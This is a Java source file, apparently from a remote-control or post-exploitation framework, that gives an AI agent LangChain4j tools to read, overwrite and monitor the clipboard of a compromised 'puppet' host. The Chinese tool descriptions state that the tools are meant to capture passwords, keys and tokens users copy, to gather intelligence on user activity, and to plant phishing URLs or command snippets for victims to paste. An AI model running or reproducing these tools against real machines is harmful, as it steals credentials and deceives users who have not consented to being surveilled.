package org.leo.ai.tools.puppetnode;

import org.leo.ai.agent.AiToolContext;
import org.leo.ai.util.PuppetNodeSessionUtils;
import org.leo.core.puppet.impl.JavaPuppetNode;
import org.slf4j.Logger;
import org.slf4j.LoggerFactory;
import dev.langchain4j.agent.tool.Tool;
import dev.langchain4j.agent.tool.P;
import org.springframework.stereotype.Component;

import java.util.Map;

/**
 * 剪贴板操作工具
 * <p>
 * 在 puppet 侧读取/写入/监控目标主机剪贴板内容。
 */
@Component
public class ClipboardTools {

    private static final Logger log = LoggerFactory.getLogger(ClipboardTools.class);

    @Tool("读取 puppet 侧目标主机当前剪贴板中的文本内容。自动适配 Windows / macOS / Linux。"
            + "返回 content(文本内容)、length(字符数)、lines(行数)、empty(是否为空)。"
            + "适合获取用户复制的敏感信息（密码、密钥、令牌），或在信息收集阶段了解用户活动。")
    public Map<String, Object> readClipboard() throws Exception {
        String sessionId = AiToolContext.requireSessionId();
        JavaPuppetNode node = PuppetNodeSessionUtils.getJavaPuppetNode(sessionId);
        return node.readClipboard();
    }

    @Tool("向 puppet 侧目标主机剪贴板写入文本内容。自动适配 Windows / macOS / Linux。"
            + "适合向目标植入需要粘贴的内容（如钓鱼 URL、命令片段）。")
    public Map<String, Object> writeClipboard(
            @P("要写入剪贴板的文本内容") String content) throws Exception {
        String sessionId = AiToolContext.requireSessionId();
        JavaPuppetNode node = PuppetNodeSessionUtils.getJavaPuppetNode(sessionId);
        return node.writeClipboard(content);
    }

    @Tool("监控 puppet 侧目标主机剪贴板内容变化，在指定时间段内轮询并记录每次变化的内容和时间戳。"
            + "返回 duration(监控时长)、changes(变化次数)、snapshots(变化记录列表)。"
            + "适合捕获用户复制的密码、密钥等敏感信息。duration 建议不超过 30 秒。")
    public Map<String, Object> monitorClipboard(
            @P("监控时长(秒)，默认 10，上限 60") int duration,
            @P("轮询间隔(秒)，默认 1") int interval) throws Exception {
        String sessionId = AiToolContext.requireSessionId();
        JavaPuppetNode node = PuppetNodeSessionUtils.getJavaPuppetNode(sessionId);
        if (duration <= 0) duration = 10;
        if (interval <= 0) interval = 1;
        return node.monitorClipboard(duration, interval);
    }
}
